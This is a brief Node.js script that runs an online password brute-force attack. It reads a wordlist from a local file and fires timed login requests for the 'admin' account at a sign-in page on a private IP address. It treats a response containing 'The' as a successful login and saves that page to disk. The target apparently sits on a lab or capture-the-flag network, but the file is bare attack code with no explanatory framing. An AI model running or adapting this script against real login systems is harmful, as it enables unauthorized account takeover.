const fs = require('fs');
const axios = require('axios');
const { exit } = require('process');


const password = fs.readFileSync('./password.txt')
const data = password.toString().split('\n')
console.log(data)
data.map((pass, index) => {
    setTimeout(() => {
        axios.get(`http://10.12.100.89/?page=signin&username=admin&password=${pass}&Login=Login`).then(res => {
            if (res.data.indexOf('The') != -1)
            {
                fs.writeFileSync('./login.txt', res.data);
                console.log('success')
            }
        })
      }, 500 * index)
})
